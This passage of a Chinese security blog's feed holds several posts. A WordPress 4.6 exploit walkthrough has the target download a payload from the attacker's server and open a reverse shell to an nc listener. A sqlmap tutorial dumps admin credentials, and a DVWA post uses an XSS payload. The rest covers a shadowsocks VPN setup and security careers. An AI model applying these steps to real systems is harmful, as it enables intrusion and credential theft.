&lt;p&gt;　　所以176行源码改为&lt;code&gt;nc -vv -l -p 1337&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;　　那么到这里我们就把EXP脚本配置修改完毕了！&lt;/p&gt;
&lt;p&gt;　　现在来整体解析下主要部分的功能！&lt;/p&gt;
&lt;p&gt;　　81行&lt;code&gt;rev_host&lt;/code&gt;的值是攻击机的IP地址&lt;/p&gt;
&lt;p&gt;　　83-97行，这部分是构造header中攻击代码的函数，具体把我们要执行的命令传递进来按照漏洞规则写进host中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/16/16-6.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　142-155行，是判断输入，是否输入目标地址，以及是否确认获取目标地址的反弹shell。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/16/16-7.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　157-161行，这里是把目标服务器（靶机）请求连接的命令写入到当前目录中的rce.txt文件中，同时使用python把当前目录临时发布到http网络中，使得可以远程访问当前目录中的文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/16/16-8.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　163行-173行，这部分调用了两次prep_host_header函数，也执行了两次命令，163-167行是在靶机上执行命令，远程把攻击机上的rce.txt文件内容下载到本地/tmp/目录下的rce文件中；而169-173行是在靶机上执行命令，执行/tmp/目录下的rce文件，也就是执行了rce中的请求连接攻击机的命令，以此达到反弹shell到攻击机的目的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/16/16-9.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　最后一部分，这里是在攻击机上执行nc监听命令，监听并连接靶机发送过来的连接请求，从而得到靶机的shell。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/16/16-10.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;EXP攻击效果展示&quot;&gt;&lt;a href=&quot;#EXP攻击效果展示&quot; class=&quot;headerlink&quot; title=&quot;EXP攻击效果展示&quot;&gt;&lt;/a&gt;EXP攻击效果展示&lt;/h2&gt;&lt;p&gt;　　EXP攻击命令：&lt;br&gt;　　&lt;code&gt;#./test.sh http://192.168.10.33/frame/WordPress/WordPress-4.6/&lt;/code&gt;&lt;br&gt;　　从攻击命令可以看出，不需要什么特殊连接，直接就是wordpress的主页地址即可。攻击成功后，效果如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/16/16-11.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　执行whoami和ifconfig命令：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/16/16-12.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;　　整个攻击过程，需要注意的问题：&lt;/p&gt;
&lt;p&gt;　　1、靶机的搭建，邮件服务必须有&lt;/p&gt;
&lt;p&gt;　　2、EXP中攻击机的IP设置&lt;/p&gt;
&lt;p&gt;　　3、EXP中nc命令的修改&lt;/p&gt;
&lt;p&gt;　　4、EXP中wordpress用户名或邮箱地址必须正确&lt;/p&gt;
&lt;p&gt;　　5、脚本的执行权限&lt;/p&gt;
&lt;p&gt;　　PS：从该EXP源码中，我们不难看出，其基本都是给予攻击机和靶机都是linux系统而写的各种执行命令，如164行调用靶机的curl进行获取远程服务器的rce.txt文件，160行在攻击机上使用python和176行使用nc,这些都是在linux上执行时的命令格式，如果使用windows系统，那么就需要一一做修改，而且还需要在windows系统中安装各种环境和配置，而这些在linux系统中，基本都是默认就拥有且可以使用的，所以在这里，建议小伙伴们还是用linux系统来复现吧！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;　　前阵子网上曝出了WordPress4.6的任意命令执行漏洞，而且还有poc和exp，不过貌似很多小伙伴复现失败了，这里就来分析分析吧！&lt;br&gt;
    
    </summary>
    
      <category term="others" scheme="http://yoursite.com/categories/others/"/>
    
    
      <category term="exp" scheme="http://yoursite.com/tags/exp/"/>
    
      <category term="wordpress" scheme="http://yoursite.com/tags/wordpress/"/>
    
  </entry>
  
  <entry>
    <title>15.使用ubuntu和shadowsocks搭建vpn服务器</title>
    <link href="http://yoursite.com/%E4%BD%BF%E7%94%A8ubuntu%E5%92%8Cshadowsocks%E6%90%AD%E5%BB%BAvpn%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://yoursite.com/使用ubuntu和shadowsocks搭建vpn服务器/</id>
    <published>2017-01-22T09:32:41.000Z</published>
    <updated>2017-01-23T02:03:46.779Z</updated>
    
    <content type="html">&lt;p&gt;　　今天来说说，如何在ubuntu上搭建vpn服务器，让我们可以愉快的翻墙！&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;前期准备&quot;&gt;&lt;a href=&quot;#前期准备&quot; class=&quot;headerlink&quot; title=&quot;前期准备&quot;&gt;&lt;/a&gt;前期准备&lt;/h2&gt;&lt;p&gt;　　这里我们用ubuntu + shadowsocks来搭建我们的vpn服务器进行翻墙&lt;/p&gt;
&lt;p&gt;　　首先，我们需要一个国外的ubuntu服务器，这里我用的是搬瓦工（bandwagon），附上地址：&lt;a href=&quot;http://banwagong.cn/&quot; title=&quot;搬瓦工中文网&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://banwagong.cn/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/15/15-1.png&quot; alt=&quot;Angoddess&quot;&gt; &lt;/p&gt;
&lt;p&gt;　　还是挺便宜的，比阿里便宜很多，当然，土壕请忽略哈！&lt;/p&gt;
&lt;p&gt;　　这是我的服务器&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/15/15-2.png&quot; alt=&quot;Angoddess&quot;&gt; &lt;/p&gt;
&lt;p&gt;　　这里要说下，如果你搬瓦工用的centos的系统（系统可以任意重装的），他的web端管理后台提供一键安装shadowsocks的功能，非常方便，不过我们今天主要讲ubuntu的安装哈。&lt;/p&gt;
&lt;p&gt;　　接下来，我们先下个shadowsocks的客户端，地址：&lt;a href=&quot;http://pan.baidu.com/s/1nuAcrwP&quot; title=&quot;shadowsocks客户端&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pan.baidu.com/s/1nuAcrwP&lt;/a&gt; 4k6u&lt;/p&gt;
&lt;h2 id=&quot;安装shadowsocks&quot;&gt;&lt;a href=&quot;#安装shadowsocks&quot; class=&quot;headerlink&quot; title=&quot;安装shadowsocks&quot;&gt;&lt;/a&gt;安装shadowsocks&lt;/h2&gt;&lt;p&gt;　　搬瓦工系统刚装完，要更新获取一下源，ubuntu直接&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get update &amp;amp; apt-get upgrade
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;　　完成之后，我们开始安装shadowsocks服务端，首先安装pip&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get install python-pip
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;　　接着就可以用pip来安装shadowsocks服务端了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pip install shadowsocks
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;配置启用shadowsocks服务端&quot;&gt;&lt;a href=&quot;#配置启用shadowsocks服务端&quot; class=&quot;headerlink&quot; title=&quot;配置启用shadowsocks服务端&quot;&gt;&lt;/a&gt;配置启用shadowsocks服务端&lt;/h2&gt;&lt;p&gt;　　安装非常快的，秒好，剩下的就是配置了，在etc下创建一个文件，保存配置信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;vim /etc/shadowsocks.json
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;　　内容如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{
    &amp;quot;server&amp;quot;: &amp;quot;10.10.10.10&amp;quot;,
    &amp;quot;server_port&amp;quot;: &amp;quot;8388&amp;quot;,
    &amp;quot;local_address&amp;quot;: &amp;quot;127.0.0.1&amp;quot;,
    &amp;quot;local_port&amp;quot;: &amp;quot;1080&amp;quot;,
    &amp;quot;port_password&amp;quot;: {
        &amp;quot;8387&amp;quot;: &amp;quot;password&amp;quot;
    },
    &amp;quot;timeout&amp;quot;: 300,
    &amp;quot;method&amp;quot;: &amp;quot;aes-256-cfb&amp;quot;,
    &amp;quot;fast_open&amp;quot;: false
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;　　server是你的服务器外网IP，server_port是你服务器开通该服务的端口号，local_address是本地代理的地址，local_port是本地代理的端口号，port_password是创建客户端账号，其中8387是端口号，password是密码，这里可以创建多个账号，供多人连接，再往下，timeout是超时时间，method是加密方式，从客户端那里可以看到有多种加密方式，fast_open是提供是否使用TCP连接。&lt;/p&gt;
&lt;p&gt;　　配置好文件之后，我们就启动它&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ssserver ‐c /etc/shadowsocks.json ‐d start
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;客户端连接&quot;&gt;&lt;a href=&quot;#客户端连接&quot; class=&quot;headerlink&quot; title=&quot;客户端连接&quot;&gt;&lt;/a&gt;客户端连接&lt;/h2&gt;&lt;p&gt;　　服务端shadowsocks启用好了，现在我们尝试用客户端连接试试，注意信息要跟服务器配置一致，加密方式也要一致&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/15/15-3.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　在任务栏中右键我们的shadowsocks客户端（纸飞机图标），选在启用系统代理&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/15/15-4.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　图标由灰色变白色即可&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/15/15-5.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　最后我们测试下，是否真的连上了，百度ip，成功了！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/15/15-6.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　访问fackbook&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/15/15-7.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;p&gt;　　注意浏览器要设置本地代理，代理端口就是之前设置的本地代理端口，这里我用chrome插件实现代理&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;　　今天来说说，如何在ubuntu上搭建vpn服务器，让我们可以愉快的翻墙！&lt;br&gt;
    
    </summary>
    
      <category term="others" scheme="http://yoursite.com/categories/others/"/>
    
    
      <category term="network" scheme="http://yoursite.com/tags/network/"/>
    
      <category term="vpn" scheme="http://yoursite.com/tags/vpn/"/>
    
  </entry>
  
  <entry>
    <title>14.写给母校在学安全的小伙伴的一些碎碎念</title>
    <link href="http://yoursite.com/%E5%86%99%E7%BB%99%E6%AF%8D%E6%A0%A1%E5%9C%A8%E5%AD%A6%E5%AE%89%E5%85%A8%E7%9A%84%E5%B0%8F%E4%BC%99%E4%BC%B4%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    <id>http://yoursite.com/写给母校在学安全的小伙伴的一些碎碎念/</id>
    <published>2017-01-09T14:23:03.000Z</published>
    <updated>2017-01-09T15:29:26.863Z</updated>
    
    <content type="html">&lt;p&gt;　　大家都说安全专业热门，连国家领导都关注重视，那么大学念安全专业，毕业之后到底能做什么？有什么岗位选择？&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;　　之所以想写这么篇东西，完全是因为母校的师弟师妹对于安全行业的玩意太陌生了，虽然都是科班出身，还都是安全专业，然并卵，一毕业普遍两眼一抹黑，很多都转开发，转运维，甚至转行了。&lt;/p&gt;
&lt;p&gt;　　为什么呢？因为茫然！大学四年，第一年基础课程，一些杂七杂八的基础课，大部分跟IT木有关系，少部分技术基础课程，像C语言之类的；第二年，网络相关课程，服务器啊，交换路由什么的。作为安全专业的孩子，很多学到这一年都有种深深的彷徨感，因为很多小伙伴都是怀着黑客梦选的专业啊，两年了毛都没摸到，开始有不少伙伴退缩了，转向了。。。第三年，终于接触安全课程了，然而，基本都是服务器安全，等保，密码学之类的知识，想象中的黑客攻击，壮观宏大的场面，绚丽的技术画面并木有。第四年，很好，准备毕业了，这年没什么课程了，搞搞毕设什么的就结束了。。。&lt;/p&gt;
&lt;p&gt;　　讲真，我不知道其他学校安全专业怎么学的，然而如果真的按这流程学，我只能说，出来就小白从头来吧，除非你是学霸中的战斗机，自学的那就另说了。说白了，如果不靠自学，基本白混。而且我觉得吧，大学课程应该也早点给学生介绍安全企业存在哪些安全岗位方向，现在安全飞速发展，很多安全岗位方向，职责明确，如果学生早点知道，毕业就不至于跟无头苍蝇似的，不知道能干嘛，还要从新了解。&lt;/p&gt;
&lt;h2 id=&quot;安全公司&quot;&gt;&lt;a href=&quot;#安全公司&quot; class=&quot;headerlink&quot; title=&quot;安全公司&quot;&gt;&lt;/a&gt;安全公司&lt;/h2&gt;&lt;p&gt;　　国外的这里就不说啦，国内的，老牌安全公司，启明星辰，绿盟科技，360企业安全，深信服，安恒等这些。&lt;/p&gt;
&lt;p&gt;　　还有一些的企业安全团队，像阿里，腾讯，百度，唯品会等这些内部的安全团队也是挺厉害的。&lt;/p&gt;
&lt;p&gt;　　接着就是一些初创安全公司，比较出名的有斗象科技，之前的乌云等。&lt;/p&gt;
&lt;p&gt;　　这些公司各有所长，以及自己专攻的方向，像启明的话，还是设备为主，较攻防技术来说，绿盟要好一些,斗象科技则是主要做众包测试的，也就是常说的众测。&lt;/p&gt;
&lt;p&gt;　　既然是写给母校小伙伴的福利，那么当然要重点说说广州的安全公司，毕竟大部分小伙伴应该还是会首选广州作为发展地的。&lt;/p&gt;
&lt;p&gt;　　广州安全公司大大小小，说多不多，说少不少，好坏这里就不评价了，想知道的可以私我哈。说说有哪些吧！&lt;/p&gt;
&lt;p&gt;　　启明星辰，绿盟科技在广州都有分公司，360在广州也有团队，不过貌似没有前面两家那么大。接着就是广东省信息安全测评中心，算半个国家机关吧，据说在华南地区还是蛮有影响力的。对了还有个蓝盾，据说呀，是广州本土唯一一家上市安全公司，不过讲真，去了你就知道，呵呵。剩下的还有南方信息安全产业基地，万方计算机科技，安佳信息科技，魔方安全科技，昊恒信息科技等等。&lt;/p&gt;
&lt;h2 id=&quot;岗位简说&quot;&gt;&lt;a href=&quot;#岗位简说&quot; class=&quot;headerlink&quot; title=&quot;岗位简说&quot;&gt;&lt;/a&gt;岗位简说&lt;/h2&gt;&lt;p&gt;　　这里简单说说在安全公司当中，比较常见的一些技术岗位，以及相关的主要工作内容。PS：以下排名无先后&lt;/p&gt;
&lt;p&gt;　　NO.1，等级保护测评师（等保测评师，信息安全等级测评师）。&lt;/p&gt;
&lt;p&gt;　　这个岗位主要是对客户目标范围内的安全环境和强度进行评测，包括主机安全，网络环境安全，应用和数据安全，管理安全，物理安全等，每一个部分，每一项都有详细的标准，而且根据客户所属行业不同，对应的应达标的安全等级也不一样，标准也不同。详细客观的评测目标安全，每一项都会有特定的分数计算，严格按照国家规定标准执行。说白了，这是一个比较累人和繁琐的工作，要熟悉各种制度和等级划分之类的玩意，讲真，重点在于报告。&lt;/p&gt;
&lt;p&gt;　　NO.2，安全服务攻城狮（简称安服）。&lt;/p&gt;
&lt;p&gt;　　这个岗位一般涵盖几个内容，包括漏洞扫描，安全核查，安全加固这些。漏洞扫描，顾名思义，就是直接利用漏洞扫描软件对客户目标进行扫描，主要针对服务器主机操作系统，中间件，数据库以及其他开放的端口服务的漏洞。当然，这里用的都是商业级扫描器，或者自己公司开发的安全扫描器。最后整理做成报告，针对扫描结果提出修复加固建议。而安全核查则是针对服务器操作系统，中间件，应用系统，数据库，安全设备，网络环境等的安全配置进行核查，是否符合客户所在行业的安全最低标准，有点类似与等保，也是需要逐个去核对，一般会有核查表，一项项进行核对，打分，最后整理成报告并提出修复建议。最后安全加固，就是对服务器，以及其他网络设备，安全设备上存在的漏洞进行修复和加强防护。整体来说，安服的主要工作内容也比较简单，主要要熟悉基本的网络设备，安全设备，以及服务器上的一些安全配置和加固方法等。&lt;/p&gt;
&lt;p&gt;　　NO.3，渗透测试攻城狮&lt;/p&gt;
&lt;p&gt;　　渗透测试攻城狮，一般情况下，接触的比较多的是web渗透，有内网环境和外网环境，主要就是对客户目标web应用进行渗透，说白了就是找漏洞，如果处于内网环境，我们还会扩大测试手段，针对内网服务器，主机以及网络设备等直接进行漏洞测试，然后一一验证，把所有漏洞整理汇总写成报告，并提出修复方案，客户修复后，又再核查是否修复直至完全修复为止。当然，渗透还是要以客户要求为主，如果范围限死，那么就不能随便乱搞啦，只能指哪打哪，不然都白搞，还要被屌，所以，授权和范围很重要。在渗透当中，还会包含另外一项工作，这个在一些公司有，一些没有，也就是代码审计，针对源码进行漏洞挖掘，这项工作内容，在甲方公司存在的多。总体来说这个岗位对于技术的要求相对来说较高一些。&lt;/p&gt;
&lt;p&gt;　　NO.4，逆向攻城狮&lt;/p&gt;
&lt;p&gt;　　逆向攻城狮包括PC端和移动的，这里说说移动逆向。移动逆向可以分android和ios两个方向，初期可以先一个方向，积累足够再涉猎另一个吧，毕竟人的精力是有限的。在现在的普通安全公司，这个主要对移动应用进行反编译，重打包，组件漏洞，缓冲溢出，内存溢出等进行测试，然后整理汇总发现的漏洞，提出修复建议方案。个人觉得，技术含量相当高，至少笔者目前做不了，宝宝还是太水了。。。。&lt;/p&gt;
&lt;p&gt;　　NO.5，无线安全攻城狮&lt;/p&gt;
&lt;p&gt;　　不少安全公司会有无线安全攻城狮，专门研究无线安全的，毕竟现在在哪都有无线，覆盖率还是蛮大的，自然安全也就尤为重要了。这个我了解不多，还真不是特别清楚搞啥子，估计以研究为主吧。也有客户会要求做无线安全测试的，那就需要针对无线进行攻击测试了。&lt;/p&gt;
&lt;p&gt;　　NO.6，安全开发攻城狮&lt;/p&gt;
&lt;p&gt;　　顾名思义，就是高安全开发的啦，有开发脚本程序的，也有开发大型工具的，如商业级扫描器。具体就要看公司要求了。用到的语言，我知道的，python，java为主吧。&lt;/p&gt;
&lt;p&gt;　　其他&lt;/p&gt;
&lt;p&gt;　　还有一些其他的安全岗位，如安全架构师，云安全攻城狮什么的，这里就不说啦，毕竟这些基本甲方公司才会有，普通安全公司还是以乙方服务为主，并没有这么的哈，或者一些专攻特定方向的安全公司会有相关岗位，如主攻云安全的，肯定有大量云安全相关的岗位。还有类似专门研究CTF的，在众测平台还会有漏洞审核岗位，这些都是公司性质和研究方向定的哈，另外就是公司如果有自己的研究实验室，也会有研究型的安全岗位的。这里就说说大众的乙方安全公司岗位，其他不谈。&lt;/p&gt;
&lt;h2 id=&quot;结束&quot;&gt;&lt;a href=&quot;#结束&quot; class=&quot;headerlink&quot; title=&quot;结束&quot;&gt;&lt;/a&gt;结束&lt;/h2&gt;&lt;p&gt;　　暂时就说这么多啦，以后有空再给小伙伴们说说其他的，或者详细讲讲其中的一些道道，希望对你们有帮助哈。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;　　大家都说安全专业热门，连国家领导都关注重视，那么大学念安全专业，毕业之后到底能做什么？有什么岗位选择？
    
    </summary>
    
      <category term="others" scheme="http://yoursite.com/categories/others/"/>
    
    
      <category term="信息安全" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="安全见识" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E8%A7%81%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>13.利用sqlmap进行简单的注入</title>
    <link href="http://yoursite.com/%E5%88%A9%E7%94%A8sqlmap%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/利用sqlmap进行简单的注入/</id>
    <published>2016-10-24T02:43:03.000Z</published>
    <updated>2016-10-24T07:21:12.334Z</updated>
    
    <content type="html">&lt;p&gt;　　本文简单介绍了利用sqlmap进行注入测试的常规流程，基于get和post的方法。 &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Sqlmap简介&quot;&gt;&lt;a href=&quot;#Sqlmap简介&quot; class=&quot;headerlink&quot; title=&quot;Sqlmap简介&quot;&gt;&lt;/a&gt;Sqlmap简介&lt;/h2&gt;&lt;p&gt;　　Sqlmap是一款python开发的自动化注入工具，在sql注入工具中，一直颇负盛名，也是广大渗透测试爱好者们的喜爱工具之一。&lt;br&gt;Kali系统中自带该工具，其他渗透测试系统一般也会自带有该工具。Github下载地址：&lt;a href=&quot;https://github.com/sqlmapproject/sqlmap&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/sqlmapproject/sqlmap&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;基于Get的注入&quot;&gt;&lt;a href=&quot;#基于Get的注入&quot; class=&quot;headerlink&quot; title=&quot;基于Get的注入&quot;&gt;&lt;/a&gt;基于Get的注入&lt;/h2&gt;&lt;p&gt;　　下面根据注入点的位置不同，我们来看看get和post的注入点，sqlmap如何利用的。&lt;br&gt;　　利用Sqlmap进行get注入非常简单，使用-u参数，后面带url链接即可&lt;br&gt;&lt;img src=&quot;/uploads/13/13-1.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　如果链接中有多个get参数，可以加-p指定想测试的参数&lt;br&gt;&lt;img src=&quot;/uploads/13/13-2.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　如果存在注入点可进行注入，那么结果会出现类似下图的信息&lt;br&gt;&lt;img src=&quot;/uploads/13/13-3.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　从图中可以看到，注入点参数，注入类型和方法，目标数据库类型，操作系统类型，中间件版本等信息。&lt;br&gt;　　由于我们只是执行了注入点的探测，所以只有这些信息，确定存在注入后，可以使用–dbs获取所有数据库列表，或者—current-db获取当前数据库名&lt;br&gt;&lt;img src=&quot;/uploads/13/13-4.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;&lt;img src=&quot;/uploads/13/13-5.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;&lt;img src=&quot;/uploads/13/13-6.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;&lt;img src=&quot;/uploads/13/13-7.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　一般我们是先读取当前数据库信息，寻找管理员表，以进入站点管理后台，如图获取当前数据库表名，–tables参数是读取表名，-D指定数据库名，这里使用当前数据库名&lt;br&gt;&lt;img src=&quot;/uploads/13/13-8.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　从得到的表名中，我们分析猜测，哪个最可能是站点管理员表&lt;br&gt;&lt;img src=&quot;/uploads/13/13-9.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　然后利用—columns参数读取该表字段名，查看是否有与用户名密码相关的字段名，进一步确定该表是否存放了管理员登陆用户名密码，-T参数后面跟的是要读取字段名信息的表&lt;br&gt;&lt;img src=&quot;/uploads/13/13-10.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　从字段名中可以看出，这极大可能就是管理员表&lt;br&gt;&lt;img src=&quot;/uploads/13/13-11.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　最后我们来读取信息，使用—dump参数进行数据读取&lt;br&gt;&lt;img src=&quot;/uploads/13/13-12.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　结果出来了，我们获取到了站点的管理员账号和密码，这里密码经过了加密，可以利用cmd5站点或其他方法进行解密，这就是sqlmap的常规注入流程。&lt;/p&gt;
&lt;h2 id=&quot;基于Post的注入&quot;&gt;&lt;a href=&quot;#基于Post的注入&quot; class=&quot;headerlink&quot; title=&quot;基于Post的注入&quot;&gt;&lt;/a&gt;基于Post的注入&lt;/h2&gt;&lt;p&gt;　　那么post注入会是怎样的呢？&lt;br&gt;　　其实post注入也大体一样，只是在代入链接的同时，需要代入post数据。以DVWA登陆为例，登陆通常都是post提交登陆数据的（PS：只是举例，并非该位置真的存在注入）。&lt;br&gt;&lt;img src=&quot;/uploads/13/13-13.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　那么利用sqlmap进行注入时的用法如图：&lt;br&gt;&lt;img src=&quot;/uploads/13/13-14.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　从图中可以看到我们使用–data参数，后面跟的就是post数据，post数据从抓包软件抓取的数据包中得到，或者利用火狐插件hackbar得到。其余的获取数据库，表名，字段名，读取数据等，与get并无区别，不—data必须一直存在。&lt;br&gt;　　最后温馨提示：&lt;br&gt;　　Sqlmap读取数据是会默认下载到本地的，而且未经允许读取大量的数据是属于犯法的行为。&lt;br&gt;　　渗透需谨慎，拖库请三思！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;　　本文简单介绍了利用sqlmap进行注入测试的常规流程，基于get和post的方法。
    
    </summary>
    
      <category term="others" scheme="http://yoursite.com/categories/others/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="网络安全" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>12.渗透测试平台DVWA之反射型XSS</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0DVWA%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/"/>
    <id>http://yoursite.com/渗透测试平台DVWA之反射型XSS/</id>
    <published>2016-08-09T09:25:30.000Z</published>
    <updated>2016-08-09T09:39:51.562Z</updated>
    
    <content type="html">&lt;p&gt;　　本文通过DVWA平台的XSS reflected模块进行反射型XSS漏洞的简单分析和原理讲解。 &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;XSS介绍&quot;&gt;&lt;a href=&quot;#XSS介绍&quot; class=&quot;headerlink&quot; title=&quot;XSS介绍&quot;&gt;&lt;/a&gt;XSS介绍&lt;/h2&gt;&lt;p&gt;　　XSS是由于数据获取传输过程中，对于用户输入过滤不严而导致的，这点上跟sql注入有点类似。区别在于sql注入主要针对于数据库，而xss则以前端js为主。然而千万不要小看XSS，其危害小可直接忽略，大可直捣后台。&lt;br&gt;　　这次要介绍的是反射型XSS，此类XSS一般局限性较大，而且其危害还要视站点的流量和用途而定。&lt;br&gt;　　那么什么是反射型XSS，我们以DVWA平台上的例子来说说&lt;/p&gt;
&lt;h2 id=&quot;（一）Low级别XSS&quot;&gt;&lt;a href=&quot;#（一）Low级别XSS&quot; class=&quot;headerlink&quot; title=&quot;（一）Low级别XSS&quot;&gt;&lt;/a&gt;（一）Low级别XSS&lt;/h2&gt;&lt;p&gt;　　在DVWA平台中，Low级别的XSS是几乎没做防护处理的，我们可以任意的利用XSS攻击平台。&lt;br&gt;　　正常的显示如下图，会把我们输入的字符串直接打印出来。&lt;br&gt;&lt;img src=&quot;/uploads/12/12-1.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　我们直接输入特殊构造的字符串&lt;code&gt;&amp;lt;script&amp;gt;alert(“XSS Test”)&amp;lt;/script&amp;gt;&lt;/code&gt;，来触发XSS，如图：&lt;br&gt;&lt;img src=&quot;/uploads/12/12-2.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　可以看到成功触发了XSS，弹窗显示了预期结果。&lt;br&gt;　　仔细看，我们会发现，其实我们输入的内容就在url当中作为name参数的值，所以，只要我们把这个链接发给任何人，他点击了，就都会触发该效果，是不是感觉有点眼熟？没错，这就跟我们平时收到的很多垃圾邮件啊，短信啊什么的，里面的链接是有点类似的，并非所有都是XSS，也可能是伪站，但还是有相当一部分就是XSS链接来的。&lt;br&gt;　　如果我们把script里的内容换了，不是弹窗，而是获取当前cookie并发送到指定邮箱，那么，呵呵，别人就获取到你当前的登录状态了，可以直接访问你的个人信息等等，如果还是个管理员，那就大发了。&lt;br&gt;　　当然，XSS的局限性也是挺强，首先必须cookie没过期才可以利用，其次必须点击者刚好登录了对应站点，所以往往此类漏洞都是跟其他的漏洞配合利用的，还多结合社会工程学。&lt;br&gt;　　下面看看源码：&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span 